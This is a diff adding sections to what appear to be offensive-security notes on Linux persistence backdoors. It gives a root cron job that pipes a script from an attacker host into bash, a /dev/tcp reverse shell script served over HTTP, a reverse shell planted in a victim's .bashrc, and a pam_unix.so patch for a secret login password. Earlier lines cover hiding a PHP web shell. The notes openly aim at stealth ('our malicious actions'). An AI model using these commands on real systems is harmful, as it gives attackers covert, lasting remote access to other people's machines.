@@ -31,3 +31,32 @@
 - Make backdoor more hidden
     1. Try to add this piece of code in already existing php files in /var/www/html. Adding it more towards the middle of files will definitely make our malicious actions a little more secret.
     2. Change the "cmd" parameter to something else... anything actually... just change it to something that isn't that common. "Cmd" is really common and is already really well known in the hacking community.
+
+## CronJob Backdoors
+- See current cronjobs with `cat /etc/crontab`
+- Set up a cron job on the target machine `* *     * * *   root    curl http://<attacker ip>:8080/shell | bash`
+    - This will look continuously for the file named `shell` on your machine and run it with bash
+- Create a file named `shell` on your machine that gives you a reverse shell
+```
+#!/bin/bash
+
+bash -i >& /dev/tcp/<ip>/<port> 0>&1
+```
+- Now host it on your web server with `python3 -m http.server 8080`
+- Whenever you want a reverse shell into the target machine, just listen with `nc -nvlp <port>`
+- This backdoor isn't hidden because anyone can see it by looking inside /etc/crontab
+
+## .bashrc Backdoors
+- If a user uses bash as their login shell, the `.bashrc` file is executed when bash is run
+- If a user uses bash on their system often, simply add this into their `.bashrc`: `bash -i >& /dev/tcp/<ip>/<port> 0>&1`
+- Disadvantage is that you will have to always have your nc listener on because you don't know when the user will launch bash
+- Pretty secretive because nobody things about checking their `.bashrc` file
+
+## pam_unix.so Backdoors
+- `pam_unix.so` is a file that is responsible for authentication
+    - It uses `unix_verify_password` function to compare the user's hash from `/etc/shadow` to the one being supplied
+- We simply need to change the code so that we have a special password that will log us into the system
+- ![Pam 1](Images/pam_1.png)
+- ![Pam 2](Images/pam_2.png)
+- [Resource](http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html)
+- [Resource](https://github.com/zephrax/linux-pam-backdoor)
